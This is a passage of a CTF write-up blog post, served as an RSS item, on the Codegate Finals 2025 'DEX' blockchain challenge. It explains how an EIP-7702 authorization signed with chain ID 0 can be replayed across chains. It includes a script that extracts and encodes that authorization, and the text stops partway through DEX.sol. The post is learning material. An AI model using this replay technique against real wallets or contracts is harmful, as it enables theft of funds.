<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Finals on teddyctf</title>
    <link>https://TheSavageTeddy.github.io/tags/finals/</link>
    <description>Recent content in Finals on teddyctf</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <copyright>teddyctf</copyright>
    <lastBuildDate>Tue, 15 Jul 2025 13:26:40 +1000</lastBuildDate><atom:link href="https://TheSavageTeddy.github.io/tags/finals/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Blockchain Writeup - Codegate Finals 2025</title>
      <link>https://TheSavageTeddy.github.io/featured/codegate-finals-2025/</link>
      <pubDate>Tue, 15 Jul 2025 13:26:40 +1000</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/featured/codegate-finals-2025/</guid>
      <description>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;A few days ago, I had the opportunity to participate in the CODEGATE 2025 Finals CTF. I played with the team &lt;a href=&#34;https://ctftime.org/team/280849&#34;&gt;ü§¨üá´üá∑üõπüêª&lt;/a&gt; (Pissed French Skateboarding Bears), and we managed to place 7th out of 20 teams!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;In this blog post, I will provide a detailed walkthrough of &lt;code&gt;DEX&lt;/code&gt;, an interesting cross-chain blockchain challenge that I managed to get first blood on!&lt;/p&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/codegate-finals-2025/#dex---8-solves&#34;&gt;DEX&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;blockchain&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;dex---8-solves-&#34;&gt;DEX - 8 solves ü©∏&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;DEX
I love Web3.0, so I made cross chain dex :)
nc 16.184.13.125 1337&lt;/p&gt;</description>
      <content>&lt;h1 id=&#34;overview&#34;&gt;Overview&lt;/h1&gt;
&lt;p&gt;A few days ago, I had the opportunity to participate in the CODEGATE 2025 Finals CTF. I played with the team &lt;a href=&#34;https://ctftime.org/team/280849&#34;&gt;ü§¨üá´üá∑üõπüêª&lt;/a&gt; (Pissed French Skateboarding Bears), and we managed to place 7th out of 20 teams!&lt;/p&gt;

  &lt;img src=&#34;./img/scoreboard.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;In this blog post, I will provide a detailed walkthrough of &lt;code&gt;DEX&lt;/code&gt;, an interesting cross-chain blockchain challenge that I managed to get first blood on!&lt;/p&gt;
&lt;p&gt;Enjoy!&lt;/p&gt;
&lt;h1 id=&#34;challenges-overview&#34;&gt;Challenges Overview&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Challenge&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;a href=&#34;https://TheSavageTeddy.github.io/featured/codegate-finals-2025/#dex---8-solves&#34;&gt;DEX&lt;/a&gt;&lt;/td&gt;
          &lt;td&gt;blockchain&lt;/td&gt;
          &lt;td&gt;8&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;dex---8-solves-&#34;&gt;DEX - 8 solves ü©∏&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;DEX
I love Web3.0, so I made cross chain dex :)
nc 16.184.13.125 1337&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are provided with a &lt;a href=&#34;https://TheSavageTeddy.github.io/featured/codegate-finals-2025/DEX_codegate_finals_2025.zip&#34;&gt;zip file attachment&lt;/a&gt; which unzips into 2 main folders. I will briefly highlight the important files below, but we will go into more detail later as well.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;src/contracts&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Setup.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Challenge setup, contains the requirements for solving the challenge through checks in &lt;code&gt;solve()&lt;/code&gt; function.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;DEX.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Fixed-rate token swapping contract, facilitating swaps between three ERC20 tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;FaucetLogic.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Token faucet, contains &lt;code&gt;claimToken()&lt;/code&gt; function to claim tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Token.sol&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Normal ERC20 token, slightly modified so the contract owner can &lt;code&gt;mint&lt;/code&gt; and &lt;code&gt;burn&lt;/code&gt; tokens.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;src/eth_sandbox&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;launcher.py&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Deploys challenge contracts and sets up the challenge instance.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;relayer.py&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;Cross-chain relayer (more on this later!)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To provide some context, there are two different chains, CODE chain and GATE chain. Contracts are deployed on both chains. The &lt;code&gt;DEX&lt;/code&gt; contract is both a cross-chain message sender and receiver, allowing communication across chains facilitated through the relayer &lt;code&gt;relayer.py&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Lets look at the &lt;code&gt;Setup&lt;/code&gt; contract.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;Setup.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
pragma solidity ^0.8.25;

import &amp;#34;./DEX.sol&amp;#34;;
import &amp;#34;./Token.sol&amp;#34;;
import &amp;#34;./FaucetLogic.sol&amp;#34;;

contract Setup {
    uint256 public constant CODE_CHAIN = 10;
    uint256 public constant GATE_CHAIN = 100;

    address public dex;
    address public tokenA;
    address public tokenB;
    address public tokenC;
    address public faucet;
    address public faucetLogic;
    bool public isSolved = false;
    uint256 public constant DEX_SUPPLY = 600 ether;
    constructor(address _faucet) {
        
        faucetLogic = address(new FaucetLogic());
        faucet  = _faucet;

        if(block.chainid == CODE_CHAIN) {
            tokenA = address(new Token(&amp;#34;CODE USDC&amp;#34;, &amp;#34;cUSDC&amp;#34;));
            tokenB = address(new Token(&amp;#34;CODE PURR&amp;#34;, &amp;#34;cPURR&amp;#34;));
            tokenC = address(new Token(&amp;#34;CODE MOODENG&amp;#34;, &amp;#34;cMOODENG&amp;#34;));
        } else {
            tokenA = address(new Token(&amp;#34;GATE USDC&amp;#34;, &amp;#34;gUSDC&amp;#34;));
            tokenB = address(new Token(&amp;#34;GATE PURR&amp;#34;, &amp;#34;gPURR&amp;#34;));
            tokenC = address(new Token(&amp;#34;GATE MOODENG&amp;#34;, &amp;#34;gMOODENG&amp;#34;));
        }

        Token[] memory tokens = new Token[](3);
        tokens[0] = Token(tokenA);
        tokens[1] = Token(tokenB);
        tokens[2] = Token(tokenC);

        dex = address(new DEX(msg.sender, tokens));
        Token(tokenA).mint(address(dex), DEX_SUPPLY);
        Token(tokenB).mint(address(dex), DEX_SUPPLY);
        Token(tokenC).mint(address(dex), DEX_SUPPLY);

        Token(tokenA).transferOwnership(msg.sender);
        Token(tokenB).transferOwnership(msg.sender);
        Token(tokenC).transferOwnership(msg.sender);
    }

    function getToken() public {
        if(block.chainid == GATE_CHAIN) {
            Token(tokenA).transfer(faucet, 100 ether);
            Token(tokenB).transfer(faucet, 100 ether);
            Token(tokenC).transfer(faucet, 100 ether);
        }
    }
    function solve() public {
        require(block.chainid == CODE_CHAIN, &amp;#34;Can be solved only on CODE CHAIN&amp;#34;);
        require(Token(tokenA).balanceOf(msg.sender) &amp;gt;= DEX_SUPPLY * 2, &amp;#34;Not enough USDC&amp;#34;);
        require(Token(tokenB).balanceOf(msg.sender) &amp;gt;= DEX_SUPPLY * 2, &amp;#34;Not enough PURR&amp;#34;);
        require(Token(tokenC).balanceOf(msg.sender) &amp;gt;= DEX_SUPPLY * 2, &amp;#34;Not enough MOODENG&amp;#34;);
        isSolved = true;
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It deploys three tokens, the DEX, and mints 600 of each token to the DEX. Some of its behaviour differs based on which chain it was deployed on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;getToken()&lt;/code&gt; transfers 100 of each token to &lt;code&gt;faucet&lt;/code&gt; if called on the GATE chain, otherwise it does nothing. Note that on the GATE chain this can only be called once, as the Setup contract only has 100 of each token.&lt;/li&gt;
&lt;li&gt;To solve the challenge, we must call &lt;code&gt;solve()&lt;/code&gt; on the CODE chain. The solve requirement is that we have double of the initial DEX supply of each token, aka 1200 of each of the three tokens on the CODE chain.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;challenge-first-part---getting-tokens-from-faucet&#34;&gt;Challenge first part - getting tokens from faucet&lt;/h2&gt;
&lt;p&gt;Before we look at the DEX contract, let&amp;rsquo;s take a look into how we actually obtain the 100 tokens at the start. Notice that on the GATE chain, &lt;code&gt;getToken()&lt;/code&gt; sends the tokens to &lt;code&gt;faucet&lt;/code&gt;, not the player.&lt;/p&gt;
&lt;p&gt;Looking at &lt;code&gt;launcher.py&lt;/code&gt;, we see that &lt;code&gt;faucet&lt;/code&gt; is actually an EOA (not a contract), which is surprising. However, it makes sense after I read the code and realised that &lt;code&gt;faucet&lt;/code&gt; is using &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-7702&#34;&gt;EIP-7702&lt;/a&gt;. &lt;a href=&#34;https://netbasal.medium.com/eip-7702-delegated-execution-and-sponsored-transactions-ad7f5ef80257&#34;&gt;This&lt;/a&gt; is a nice article detailing it.&lt;/p&gt;
&lt;p&gt;Essentially, during challenge deployment, &lt;code&gt;faucet&lt;/code&gt; sends a transaction with &lt;code&gt;authorizationList&lt;/code&gt; set, essentially setting its own code to &lt;code&gt;FaucetLogic&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;new_launch_instance_action&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    do_deploy: Callable[[Web3, str, str, str, int], str],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; Action:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;() &lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt; int:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i, node &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; enumerate(node_info):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            faucet_logic_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; setup_contract&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;functions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;faucetLogic()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;call()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            signed_auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; faucet_account&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign_authorization({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chainId&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;address&amp;#34;&lt;/span&gt;: faucet_logic_addr,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nonce&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;## CODE chain only&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                tx_dict[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authorizationList&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [signed_auth]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            signed_tx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; deployer_account&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign_transaction(tx_dict)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            tx_hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; web3&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eth&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send_raw_transaction(signed_tx&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;raw_transaction)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It seems like we can just call &lt;code&gt;claimToken()&lt;/code&gt; on the faucet on GATE chain to claim the tokens, right?&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-solidity&#34; data-lang=&#34;solidity&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;pragma solidity&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;.&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./Token.sol&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;contract&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FaucetLogic&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;claimToken&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt; _token) &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Token(_token).transfer(msg.sender, Token(_token).balanceOf(&lt;span style=&#34;color:#66d9ef&#34;&gt;address&lt;/span&gt;(this)));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It turns out, the transaction with &lt;code&gt;authorizationList&lt;/code&gt; set is only for CODE chain, meaning on GATE chain, &lt;code&gt;faucet&lt;/code&gt; is not using EIP-7702 and hence has no code. And the faucet only has tokens on GATE chain, not CODE chain.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#75715e&#34;&gt;## CODE chain only&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                tx_dict[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authorizationList&amp;#34;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [signed_auth]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So what do we do?&lt;/p&gt;
&lt;p&gt;My initial thought was that we had to do something related to a replay attack across the two different chains, but I didn&amp;rsquo;t quite know how that would work, since with the introduction of &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-155&#34;&gt;EIP-155&lt;/a&gt;, transaction hashes include the chain id to prevent replay attacks across different chains.&lt;/p&gt;
&lt;p&gt;However, I noticed something strange when the authorization was being signed. Both the chain Id and nonce were both set to 0. It was surprising the chain Id wasn&amp;rsquo;t set to the CODE chain id.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            signed_auth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; faucet_account&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sign_authorization({
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;chainId&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;address&amp;#34;&lt;/span&gt;: faucet_logic_addr,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nonce&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            })
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I wondered if there was any significance in the chain Id being 0 and found &lt;a href=&#34;https://namespaces.chainagnostic.org/eip155/caip10&#34;&gt;this&lt;/a&gt; which stated:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Special case of EOA&lt;/p&gt;
&lt;p&gt;To express Ethereum account without reference to any specific EIP-155 chain ID, CAIP-10 identifiers can use the special chainId segment 0.&lt;/p&gt;
&lt;p&gt;In the Ethereum account system, ‚Äúexternally owned accounts‚Äù (i.e. ‚Äúoffchain‚Äù wallets) are controlled by user agents and not by on-chain entities (i.e. deployed or deployable smart contract code). The special chainId 0 SHOULD only be used for accounts that can be used in off-chain contexts, i.e. without the use of an Ethereum node.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;It sounded a bit confusing, but essentially, EIP-155 is ignored if chain Id 0 is used. Therefore, signed transactions with chain Id of 0 are replayable on any chain!&lt;/p&gt;
&lt;p&gt;So we can set the authorization list of the faucet on GATE chain by getting the signed authorization on CODE chain, and replaying that on the GATE chain.&lt;/p&gt;
&lt;p&gt;To send a transaction with EIP-7702 authorization list, we can use Foundry&amp;rsquo;s &lt;a href=&#34;https://getfoundry.sh/cast/reference/cast-send/&#34;&gt;&lt;code&gt;cast send&lt;/code&gt;&lt;/a&gt; with the &lt;code&gt;--auth&lt;/code&gt; flag.&lt;/p&gt;
&lt;p&gt;To retrieve and format the signed authorization, I asked ChatGPT to write a script to get the first transaction in the second block and encode it so I could pass the value straight to &lt;code&gt;cast send&lt;/code&gt;.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;get_signed_authorization.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from web3 import Web3
import rlp
from eth_utils import to_bytes, keccak, to_hex

# RLP list encoding expects all values in bytes or integers
class Authorization(rlp.Serializable):
    fields = [
        (&amp;#34;chainId&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;address&amp;#34;, rlp.sedes.Binary.fixed_length(20)),
        (&amp;#34;nonce&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;yParity&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;r&amp;#34;, rlp.sedes.big_endian_int),
        (&amp;#34;s&amp;#34;, rlp.sedes.big_endian_int),
    ]

import os
# RPC endpoint
CODE_RPC = os.getenv(&amp;#34;RPCURL_CODE&amp;#34;)
w3 = Web3(Web3.HTTPProvider(CODE_RPC))

# Get block 0x2 and its transactions
block = w3.eth.get_block(2, full_transactions=True)

if not block[&amp;#34;transactions&amp;#34;]:
    print(&amp;#34;‚ùå No transactions in block 0x2&amp;#34;)
    exit(1)

tx = block[&amp;#34;transactions&amp;#34;][0]

if &amp;#34;authorizationList&amp;#34; not in tx or not tx[&amp;#34;authorizationList&amp;#34;]:
    print(&amp;#34;‚ùå No authorizationList in first transaction&amp;#34;)
    exit(1)

auth = tx[&amp;#34;authorizationList&amp;#34;][0]

# Extract fields
chain_id = int(auth[&amp;#34;chainId&amp;#34;], 16)
address = bytes.fromhex(auth[&amp;#34;address&amp;#34;][2:])
nonce = int(auth[&amp;#34;nonce&amp;#34;], 16)
y_parity = int(auth[&amp;#34;yParity&amp;#34;], 16)
r = int(auth[&amp;#34;r&amp;#34;], 16)
s = int(auth[&amp;#34;s&amp;#34;], 16)

# RLP encode the auth
auth_obj = Authorization(chain_id, address, nonce, y_parity, r, s)
encoded = rlp.encode(auth_obj)
auth_hex = to_hex(encoded)

print(&amp;#34;‚úÖ Foundry cast send --auth value:&amp;#34;)
print(f&amp;#34;--auth {auth_hex}&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Then, we replay the signed authorization on the GATE chain to set the faucet code, allowing us to call &lt;code&gt;claimToken()&lt;/code&gt; to get tokens.&lt;/p&gt;

  &lt;img src=&#34;./img/ss1.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;



  &lt;img src=&#34;./img/ss2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 80%&#34;  /&gt;


&lt;p&gt;As shown in the images above, we successfully set the code of faucet on GATE chain.&lt;/p&gt;
&lt;h2 id=&#34;challenge-second-part---abusing-cross-chain-swapping-behaviour&#34;&gt;Challenge second part - Abusing cross-chain swapping behaviour&lt;/h2&gt;
&lt;p&gt;Now let&amp;rsquo;s look at the DEX contract.&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;DEX.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
pragma solidity ^0.8.25;

import &amp;#34;@openzeppelin/contracts/token/ERC20/IERC20.sol&amp;#34;;
import &amp;#34;./Token.sol&amp;#34;;

contract DEX {
    Token[] public tokens;
    uint256 public constant CODE_CHAIN = 10;
    uint256 public constant GATE_CHAIN = 100;
    address public immutable relayer;
    uint256[] public rates = [1_000_000, 200_000, 190_000];

    mapping(bytes32 =&amp;gt; address) public tokenMapping;

    modifier onlyRelayer() {
        require(msg.sender == relayer, &amp;#34;Only relayer&amp;#34;);
        _;
    }
    
    enum MessageType {
        LiquidityRequest,
        LiquidityResponse,
        SwapRequest
    }

    struct Message {
